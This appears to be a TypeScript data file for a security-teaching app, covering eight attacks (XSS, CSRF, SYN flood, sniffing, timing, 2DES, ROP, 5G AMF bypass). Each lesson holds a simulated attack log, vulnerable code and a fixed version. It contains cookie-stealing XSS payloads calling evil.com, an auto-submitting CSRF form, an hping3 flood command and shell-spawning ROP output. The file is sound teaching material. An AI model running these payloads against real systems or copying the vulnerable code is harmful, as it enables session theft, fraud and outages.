export type LessonStep = {
  emoji: string
  actor: string
  action: string
  detail: string
  color: string // tailwind bg color for the dot
}

export type SimLine = {
  type: 'cmd' | 'out' | 'warn' | 'success' | 'gap'
  text: string
  delay?: number // ms from previous line
}

export type AttackLesson = {
  summary: string
  keyInsight: string
  steps: LessonStep[]
  sim: SimLine[]
  vulnerableCode: string
  secureCode: string
  language: string
}

export const attackLessons: Record<string, AttackLesson> = {

  'dom-xss': {
    summary: 'Attacker injects a script tag into a URL parameter. The page writes it to the DOM via innerHTML — browser executes it.',
    keyInsight: '💡 The browser trusts everything written to the DOM. If attacker data reaches a "sink" like innerHTML without sanitization, it becomes live code.',
    steps: [
      { emoji: '👤', actor: 'Attacker', action: 'Crafts a malicious URL', detail: 'Appends ?name=<script>fetch("evil.com?c="+document.cookie)</script> to the target URL', color: 'bg-rose-500' },
      { emoji: '🔗', actor: 'Victim', action: 'Clicks the link', detail: 'Victim receives the URL (via email, chat, social media) and opens it in their browser', color: 'bg-yellow-500' },
      { emoji: '🖥️', actor: 'Browser', action: 'Parses the page', detail: 'JavaScript reads location.search and writes it directly into innerHTML — no sanitization', color: 'bg-blue-500' },
      { emoji: '💀', actor: 'Script', action: 'Executes in victim context', detail: 'The injected <script> runs with the victim\'s session cookies — data is sent to attacker server', color: 'bg-rose-600' },
    ],
    sim: [
      { type: 'cmd', text: 'python3 xss_craft.py --target "http://victim-app/search" --payload "<script>document.location=\'http://evil.com/?c=\'+document.cookie</script>"' },
      { type: 'out', text: '[*] Crafting XSS payload...', delay: 400 },
      { type: 'out', text: '[*] URL-encoding payload...', delay: 300 },
      { type: 'out', text: '[+] Malicious URL: http://victim-app/search?q=%3Cscript%3E...', delay: 200 },
      { type: 'gap', text: '', delay: 500 },
      { type: 'cmd', text: 'python3 -m http.server 8888 # start listener' },
      { type: 'out', text: '[*] Serving on 0.0.0.0:8888 — waiting for victim cookies...', delay: 600 },
      { type: 'warn', text: '[!] INCOMING REQUEST from 192.168.1.45', delay: 1200 },
      { type: 'success', text: '[✓] Cookie captured: session_id=eyJhbGciOiJIUzI1NiJ9.abc123.xyz' },
      { type: 'success', text: '[✓] XSS successful — victim session hijacked!' },
    ],
    language: 'html',
    vulnerableCode: `// ❌ VULNERABLE — writes user input directly to DOM
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
// If name = "<script>evil()</script>" → executed!`,
    secureCode: `// ✅ SECURE — use textContent, never innerHTML
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('greeting').textContent = 'Hello, ' + name;
// textContent never interprets HTML — just plain text`,
  },

  'csrf': {
    summary: 'A forged request is sent from an attacker\'s page to a victim\'s logged-in bank. The browser auto-attaches the session cookie — the server can\'t tell it\'s forged.',
    keyInsight: '💡 Browsers automatically attach cookies to every request — even from other websites. The server sees a valid cookie and trusts the request without verifying who initiated it.',
    steps: [
      { emoji: '🏦', actor: 'Victim', action: 'Logs into their bank', detail: 'Victim authenticates — bank sets a session cookie in the browser (session_id=abc123)', color: 'bg-blue-500' },
      { emoji: '🪤', actor: 'Attacker', action: 'Sends victim a trap link', detail: 'Attacker sends email/DM: "Click here to see your invoice!" — links to evil.com', color: 'bg-rose-500' },
      { emoji: '🌐', actor: 'Browser', action: 'Visits evil.com', detail: 'evil.com auto-submits a hidden form: POST /transfer?to=attacker&amount=5000', color: 'bg-orange-500' },
      { emoji: '💸', actor: 'Bank Server', action: 'Processes the transfer', detail: 'Sees valid session_id cookie → thinks it\'s a real request → transfers funds to attacker', color: 'bg-rose-600' },
    ],
    sim: [
      { type: 'cmd', text: 'cat evil.html  # attacker page with hidden form' },
      { type: 'out', text: '<form action="https://bank.com/transfer" method="POST" id="f">', delay: 200 },
      { type: 'out', text: '  <input name="to" value="attacker_account">', delay: 100 },
      { type: 'out', text: '  <input name="amount" value="5000">', delay: 100 },
      { type: 'out', text: '</form>', delay: 100 },
      { type: 'out', text: '<script>document.getElementById("f").submit();</script>', delay: 100 },
      { type: 'gap', text: '', delay: 600 },
      { type: 'cmd', text: 'python3 serve.py --port 80 # host the trap page' },
      { type: 'warn', text: '[!] Victim visited evil.com — form auto-submitted', delay: 1400 },
      { type: 'warn', text: '[!] Browser attached cookie: session_id=abc123', delay: 400 },
      { type: 'success', text: '[✓] Bank responded 200 OK — transfer processed!' },
      { type: 'success', text: '[✓] CSRF successful — $5000 transferred without victim\'s knowledge' },
    ],
    language: 'python',
    vulnerableCode: `# ❌ VULNERABLE — no CSRF token check
@app.route('/transfer', methods=['POST'])
def transfer():
    # Only checks if user is logged in — not if THEY made this request
    if not session.get('user_id'):
        return redirect('/login')
    amount = request.form['amount']
    to = request.form['to']
    do_transfer(session['user_id'], to, amount)  # 💀 executed blindly
    return 'OK'`,
    secureCode: `# ✅ SECURE — validate CSRF token
@app.route('/transfer', methods=['POST'])
def transfer():
    if not session.get('user_id'):
        return redirect('/login')
    # Token must match what server issued — attacker can't know it
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        abort(403)  # Reject forged requests
    amount = request.form['amount']
    to = request.form['to']
    do_transfer(session['user_id'], to, amount)
    return 'OK'`,
  },

  'tcp-syn-flood': {
    summary: 'Attacker floods a server with thousands of SYN packets using fake IPs. Server allocates memory for each half-open connection until the queue is full — real users can\'t connect.',
    keyInsight: '💡 TCP requires a 3-way handshake (SYN → SYN-ACK → ACK). The server reserves resources after the first SYN. Spoofed IPs never send the final ACK, so connections pile up forever.',
    steps: [
      { emoji: '💻', actor: 'Attacker', action: 'Sends 50,000 SYN packets/sec', detail: 'Each packet has a random spoofed source IP — the server can\'t trace them back to attacker', color: 'bg-rose-500' },
      { emoji: '🖥️', actor: 'Server', action: 'Allocates half-open connections', detail: 'For each SYN, server sends SYN-ACK and creates a Transmission Control Block (TCB) using RAM', color: 'bg-yellow-500' },
      { emoji: '📦', actor: 'Queue', action: 'Backlog fills up (512 slots)', detail: 'The SYN backlog queue hits its limit — all new incoming connection attempts are silently dropped', color: 'bg-orange-500' },
      { emoji: '🚫', actor: 'Real User', action: 'Gets "Connection refused"', detail: 'Legitimate clients send SYN but server has no room — service is completely unavailable', color: 'bg-zinc-500' },
    ],
    sim: [
      { type: 'cmd', text: 'sudo hping3 -S --flood -V -p 80 192.168.56.101' },
      { type: 'out', text: 'HPING 192.168.56.101 (eth0): S set, 40 headers + 0 data bytes', delay: 300 },
      { type: 'out', text: 'hping in flood mode, no replies will be shown', delay: 200 },
      { type: 'warn', text: '[!] Sending 50,000+ packets/sec with spoofed source IPs...', delay: 800 },
      { type: 'gap', text: '', delay: 400 },
      { type: 'cmd', text: 'ssh admin@192.168.56.101 "ss -s | grep SYN"' },
      { type: 'out', text: 'TCP:  8192 (estab 3, closed 0, orphaned 8189, synrecv 8189)', delay: 600 },
      { type: 'warn', text: '[!] SYN backlog: 8189/512 — OVERFLOW DETECTED', delay: 300 },
      { type: 'warn', text: '[!] Server dropping all new legitimate connections', delay: 200 },
      { type: 'success', text: '[✓] DoS successful — server unresponsive to real users' },
    ],
    language: 'c',
    vulnerableCode: `/* ❌ VULNERABLE — standard TCP without SYN cookies
   Server allocates full TCB for every SYN packet received */
int handle_syn(struct tcp_syn_packet *pkt) {
    struct tcb *conn = allocate_tcb();  // ← RAM allocated here
    conn->src_ip = pkt->src_ip;
    conn->state = SYN_RECEIVED;
    send_syn_ack(conn);  // waits for final ACK that never comes
    backlog_queue_add(conn);  // queue fills up → DoS
    return 0;
}`,
    secureCode: `/* ✅ SECURE — SYN Cookies: no state until ACK received
   Encode connection params in the ISN — no RAM needed */
int handle_syn(struct tcp_syn_packet *pkt) {
    // No TCB allocation! Encode state into sequence number
    uint32_t cookie = syn_cookie(pkt->src_ip, pkt->src_port,
                                  pkt->dst_ip, pkt->dst_port);
    send_syn_ack_with_isn(cookie);  // stateless response
    return 0;  // RAM only allocated when valid ACK arrives
}`,
  },

  'packet-sniffing': {
    summary: 'Attacker puts network card in promiscuous mode to read all packets on a shared network segment — capturing plaintext HTTP credentials, tokens, and data.',
    keyInsight: '💡 On a shared network (Wi-Fi, hub, same VLAN), packets physically travel past every host. A NIC in promiscuous mode reads ALL packets, not just its own.',
    steps: [
      { emoji: '🌐', actor: 'Victim', action: 'Sends HTTP request', detail: 'Victim logs into a site using HTTP (not HTTPS) — credentials travel as plain text bytes', color: 'bg-blue-500' },
      { emoji: '📡', actor: 'Network', action: 'Broadcasts packets', detail: 'On Wi-Fi or a hub, frames are broadcast to all connected devices on the segment', color: 'bg-yellow-500' },
      { emoji: '🕵️', actor: 'Attacker', action: 'Captures with Wireshark/tcpdump', detail: 'NIC in promiscuous mode captures all frames — not just those addressed to attacker\'s MAC', color: 'bg-rose-500' },
      { emoji: '🔓', actor: 'Attacker', action: 'Reads credentials', detail: 'Filters for POST requests — extracts username=admin&password=hunter2 in plain text', color: 'bg-rose-600' },
    ],
    sim: [
      { type: 'cmd', text: 'sudo tcpdump -i wlan0 -A -s 0 "tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)"' },
      { type: 'out', text: 'tcpdump: listening on wlan0, link-type EN10MB', delay: 300 },
      { type: 'gap', text: '', delay: 800 },
      { type: 'warn', text: '[!] Packet captured from 10.0.0.20 → 10.0.0.1', delay: 1000 },
      { type: 'out', text: 'POST /login HTTP/1.1', delay: 200 },
      { type: 'out', text: 'Host: intranet.company.com', delay: 100 },
      { type: 'out', text: 'Content-Type: application/x-www-form-urlencoded', delay: 100 },
      { type: 'out', text: '', delay: 200 },
      { type: 'success', text: 'username=admin&password=C0mp@nyR0cks2024&remember=true' },
      { type: 'success', text: '[✓] Credentials captured in plaintext — sniff successful!' },
    ],
    language: 'bash',
    vulnerableCode: `# ❌ VULNERABLE — plaintext HTTP server
# All data is readable by anyone on the network
from http.server import HTTPServer, BaseHTTPRequestHandler

class LoginHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers['Content-Length']))
        # POST body travels in plaintext: user=admin&pass=secret
        process_login(body)  # attacker read this already`,
    secureCode: `# ✅ SECURE — enforce HTTPS with TLS 1.3
import ssl, http.server

httpd = http.server.HTTPServer(('0.0.0.0', 443), LoginHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.minimum_version = ssl.TLSVersion.TLSv1_3  # TLS 1.3 only
ctx.load_cert_chain('cert.pem', 'key.pem')
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
# All traffic now encrypted — captured packets are useless ciphertext`,
  },

  'timing-side-channel': {
    summary: 'A login function exits early when it finds the first wrong character. By measuring response time, attacker deduces the correct character one position at a time.',
    keyInsight: '💡 If "aaaaa" takes 0.1ms and "saaaa" takes 0.2ms, the first char is probably "s". Repeat for each position — recover the whole secret in O(N×alphabet) instead of O(alphabet^N).',
    steps: [
      { emoji: '⏱️', actor: 'Attacker', action: 'Sends "aaaaa" — measures 0.1ms', detail: 'First char wrong → function exits immediately at position 0 → very fast', color: 'bg-blue-500' },
      { emoji: '⏱️', actor: 'Attacker', action: 'Sends "saaaa" — measures 0.2ms', detail: 'First char matches! Exits at position 1 → slightly slower → "s" is confirmed', color: 'bg-yellow-500' },
      { emoji: '⏱️', actor: 'Attacker', action: 'Sends "seaaa" — measures 0.3ms', detail: 'Two chars match → exits at position 2 → "se" confirmed. Repeat for each position.', color: 'bg-orange-500' },
      { emoji: '🔓', actor: 'Attacker', action: 'Full secret recovered', detail: 'After 26×N attempts (N = secret length), entire secret recovered without brute force', color: 'bg-rose-500' },
    ],
    sim: [
      { type: 'cmd', text: 'python3 timing_attack.py --target 10.0.0.55 --endpoint /verify' },
      { type: 'out', text: '[*] Starting timing analysis — probing character by character...', delay: 400 },
      { type: 'out', text: '[*] Position 0: testing a-z...', delay: 200 },
      { type: 'out', text: '    "a" → 0.112ms | "b" → 0.109ms | ... | "s" → 0.218ms ← OUTLIER', delay: 800 },
      { type: 'out', text: '[+] Position 0: "s" (confidence: 97.3%)', delay: 300 },
      { type: 'out', text: '[*] Position 1: testing a-z with prefix "s"...', delay: 200 },
      { type: 'out', text: '    "sa" → 0.221ms | ... | "se" → 0.334ms ← OUTLIER', delay: 600 },
      { type: 'out', text: '[+] Position 1: "e" (confidence: 96.1%)', delay: 300 },
      { type: 'warn', text: '[!] Recovered so far: "secr..." — continuing...', delay: 400 },
      { type: 'success', text: '[✓] Secret recovered: "secret_token_42" (took 847 requests)' },
    ],
    language: 'python',
    vulnerableCode: `# ❌ VULNERABLE — early-exit comparison leaks timing info
def verify_token(user_input: str, secret: str) -> bool:
    if len(user_input) != len(secret):
        return False
    for a, b in zip(user_input, secret):
        if a != b:
            return False  # ← exits here, faster for wrong input
    return True
# Time taken reveals HOW MANY chars matched!`,
    secureCode: `# ✅ SECURE — constant-time comparison
import hmac

def verify_token(user_input: str, secret: str) -> bool:
    # Always compares ALL bytes, regardless of where mismatch is
    # Uses XOR accumulator — same time whether 0 or all chars match
    return hmac.compare_digest(
        user_input.encode('utf-8'),
        secret.encode('utf-8')
    )
    # Timing is identical for any input — no information leaked`,
  },

  'meet-in-the-middle': {
    summary: '2DES encrypts twice with two 56-bit keys. Looks like 2^112 security. But attacker can precompute from both ends and find the meeting point — actual cost is only 2×2^56.',
    keyInsight: '💡 Instead of trying all 2^112 key pairs, encrypt P with every K1 into a table, then decrypt C with every K2. When two results match — you found K1 and K2. Cost: 2^57 not 2^112.',
    steps: [
      { emoji: '📊', actor: 'Attacker', action: 'Precompute forward table', detail: 'Encrypt known plaintext P with all 2^56 possible K1 values → store 2^56 (P,C_mid) pairs', color: 'bg-blue-500' },
      { emoji: '📊', actor: 'Attacker', action: 'Precompute backward table', detail: 'Decrypt known ciphertext C with all 2^56 possible K2 values → store 2^56 (C_mid,K2) pairs', color: 'bg-purple-500' },
      { emoji: '🔍', actor: 'Attacker', action: 'Find the collision', detail: 'Sort and compare both tables — find C_mid value that appears in both → that reveals K1 and K2', color: 'bg-yellow-500' },
      { emoji: '🔓', actor: 'Attacker', action: 'Confirm with second pair', detail: 'Verify K1 and K2 decrypt a second plaintext/ciphertext pair — eliminates false positives', color: 'bg-rose-500' },
    ],
    sim: [
      { type: 'cmd', text: 'python3 mitm_2des.py --plaintext "HELLO123" --ciphertext "A3F92B1C"' },
      { type: 'out', text: '[*] Phase 1: Building forward encryption table (2^56 entries)...', delay: 400 },
      { type: 'out', text: '    Encrypting P with K1 = 0x0000000000000000 → C_mid = 0x3A1F...', delay: 200 },
      { type: 'out', text: '    ...computing 72 quadrillion entries... (simplified demo)', delay: 300 },
      { type: 'out', text: '[+] Forward table built: 72TB stored', delay: 400 },
      { type: 'out', text: '[*] Phase 2: Building backward decryption table...', delay: 300 },
      { type: 'out', text: '[+] Backward table built: scanning for collision...', delay: 600 },
      { type: 'warn', text: '[!] COLLISION FOUND at C_mid = 0x3A1F2C8E', delay: 1000 },
      { type: 'success', text: '[✓] K1 = 0x1A2B3C4D5E6F7890  K2 = 0x0F1E2D3C4B5A6978' },
      { type: 'success', text: '[✓] 2DES broken! Cost: 2×2^56 ops, not 2^112' },
    ],
    language: 'python',
    vulnerableCode: `# ❌ VULNERABLE — 2DES: looks strong, isn't
from Crypto.Cipher import DES

def two_des_encrypt(plaintext: bytes, k1: bytes, k2: bytes) -> bytes:
    # Encrypt twice with DES — seems like 2×56 = 112 bit security
    c1 = DES.new(k1, DES.MODE_ECB).encrypt(plaintext)
    c2 = DES.new(k2, DES.MODE_ECB).encrypt(c1)
    return c2
# Reality: meet-in-the-middle reduces security to ~2^57`,
    secureCode: `# ✅ SECURE — AES-256: resistant to MITM
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def aes_encrypt(plaintext: bytes) -> tuple[bytes, bytes]:
    key = get_random_bytes(32)  # 256-bit key
    cipher = AES.new(key, AES.MODE_GCM)  # authenticated encryption
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    # AES-256: no practical MITM attack possible
    return ciphertext, cipher.nonce + tag + key`,
  },

  'rop': {
    summary: 'Buffer overflow corrupts the return address on the stack. Instead of injecting code (blocked by NX), attacker chains short existing code "gadgets" ending in RET to execute arbitrary logic.',
    keyInsight: '💡 DEP/NX marks stack memory non-executable — you can\'t inject shellcode. But the program\'s own code is executable. ROP reuses it — like Lego bricks — without injecting a single new byte.',
    steps: [
      { emoji: '💾', actor: 'Attacker', action: 'Triggers buffer overflow', detail: 'Writes more than the buffer can hold, overwriting the saved return address on the stack', color: 'bg-rose-500' },
      { emoji: '🔍', actor: 'Attacker', action: 'Finds ROP gadgets with ROPgadget', detail: 'Scans the binary for useful instruction sequences: "pop rdi; ret", "mov rax, rdi; ret", etc.', color: 'bg-yellow-500' },
      { emoji: '⛓️', actor: 'Attacker', action: 'Builds gadget chain on stack', detail: 'Overwrites stack with: [gadget1_addr][data1][gadget2_addr][data2][system()]["/bin/sh"]', color: 'bg-purple-500' },
      { emoji: '🐚', actor: 'CPU', action: 'Executes chain via RET', detail: 'Each gadget runs, pops data, then RET jumps to next gadget → system("/bin/sh") → shell!', color: 'bg-rose-600' },
    ],
    sim: [
      { type: 'cmd', text: 'ROPgadget --binary vuln_server --rop | grep "pop rdi"' },
      { type: 'out', text: '0x0000000000401343 : pop rdi ; ret', delay: 300 },
      { type: 'cmd', text: 'python3 exploit.py --target systems-lab.ctf5g.local --port 9999' },
      { type: 'out', text: '[*] Finding offset to saved RIP...', delay: 400 },
      { type: 'out', text: '[+] Offset found: 72 bytes', delay: 300 },
      { type: 'out', text: '[*] Building ROP chain:', delay: 200 },
      { type: 'out', text: '    → pop rdi; ret @ 0x401343', delay: 150 },
      { type: 'out', text: '    → /bin/sh string @ 0x404020', delay: 150 },
      { type: 'out', text: '    → system() @ 0x401090', delay: 150 },
      { type: 'out', text: '[*] Sending payload (72 bytes padding + 24 byte chain)...', delay: 500 },
      { type: 'warn', text: '[!] Shell spawned — DEP/NX bypassed!', delay: 600 },
      { type: 'success', text: '[✓] $ whoami → root' },
      { type: 'success', text: '[✓] ROP chain executed — arbitrary code without injecting shellcode' },
    ],
    language: 'python',
    vulnerableCode: `# ❌ VULNERABLE — unsafe strcpy into fixed buffer
char buf[64];

void vulnerable_func(char *input) {
    // strcpy has no bounds check — writes past buffer end
    strcpy(buf, input);
    // 65+ bytes overwrite the saved return address on stack
    // Attacker controls where the function "returns" to
}

// Compile with: gcc -no-pie -o vuln vuln.c
// NX might be on but ROP bypasses it entirely`,
    secureCode: `# ✅ SECURE — multiple layered defenses
char buf[64];

void safe_func(char *input) {
    // 1. Bounds-checked copy prevents overflow
    strncpy(buf, input, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\\0';
}

// Compile with stack canary + ASLR + CFI:
// gcc -fstack-protector-strong -pie -fcf-protection=full
// Stack canary: detects overflow before return
// ASLR: gadget addresses unpredictable
// CFI: validates all indirect branch targets`,
  },

  'apt-config': {
    summary: 'A misconfigured 5G AMF (Access and Mobility Management Function) accepts NAS registration messages without verifying the subscriber\'s identity — attacker gains core network access.',
    keyInsight: '💡 The AMF is the "gatekeeper" of the 5G core. If it doesn\'t enforce SUPI authentication or mTLS between network functions, a crafted NAS message can register a fake UE and pivot to internal services.',
    steps: [
      { emoji: '🔍', actor: 'Attacker', action: 'Discovers exposed AMF interface', detail: 'Scans for open NGAP/N1 interfaces on 172.16.0.0/24 — finds AMF with misconfigured policy', color: 'bg-yellow-500' },
      { emoji: '📡', actor: 'Attacker', action: 'Crafts fake NAS Registration', detail: 'Builds a valid-looking NAS RegistrationRequest with crafted SUCI — no proper SUPI concealment', color: 'bg-rose-500' },
      { emoji: '🚪', actor: 'AMF', action: 'Accepts without full auth', detail: 'AMF skips AUSF verification (misconfigured) — issues 5G-GUTI and grants network access', color: 'bg-orange-500' },
      { emoji: '🌐', actor: 'Attacker', action: 'Pivots within core network', detail: 'Now inside the 5G core — can probe SMF, UPF, NRF, intercept user-plane traffic, or cause DoS', color: 'bg-rose-600' },
    ],
    sim: [
      { type: 'cmd', text: 'python3 open5gs_exploit.py --amf 172.16.0.10 --mode registration_bypass' },
      { type: 'out', text: '[*] Targeting AMF at 172.16.0.10:38412 (NGAP)', delay: 300 },
      { type: 'out', text: '[*] Crafting NAS RegistrationRequest...', delay: 400 },
      { type: 'out', text: '    SUCI: 0001-01-0000-0-0000000000  (nullified home network pub key)', delay: 200 },
      { type: 'out', text: '    UE Security Capabilities: NR5G-EA0 (no encryption)', delay: 200 },
      { type: 'cmd', text: 'curl -X POST http://172.16.0.10:8080/namf-comm/v1/ue-contexts -d @payload.json' },
      { type: 'warn', text: '[!] AMF responded: 201 Created — UE context established', delay: 800 },
      { type: 'warn', text: '[!] 5G-GUTI assigned: 46693-0001-00-0000000001', delay: 300 },
      { type: 'success', text: '[✓] Auth bypassed — registered as fake UE in 5G core' },
      { type: 'success', text: '[✓] Pivoting to SMF at 172.16.0.11 — APT exploit successful' },
    ],
    language: 'yaml',
    vulnerableCode: `# ❌ VULNERABLE — AMF config (open5gs amf.yaml)
amf:
  ngap:
    addr: 0.0.0.0        # exposed to all interfaces
    port: 38412
  security:
    integrity_order: [NIA0]  # NIA0 = NULL integrity — no auth!
    ciphering_order: [NEA0]  # NEA0 = NULL cipher — no encryption!
  # No AUSF URL configured — skips authentication entirely`,
    secureCode: `# ✅ SECURE — hardened AMF configuration
amf:
  ngap:
    addr: 192.168.1.1    # bind to internal interface only
    port: 38412
  security:
    integrity_order: [NIA2, NIA1]   # AES + SNOW — required
    ciphering_order: [NEA2, NEA1]   # AES + SNOW encryption
  ausf:                             # authentication required
    - uri: https://ausf.5gc.local   # mTLS to AUSF
  sbi:
    tls:                            # mutual TLS between NFs
      key: /etc/certs/amf.key
      pem: /etc/certs/amf.pem`,
  },
}
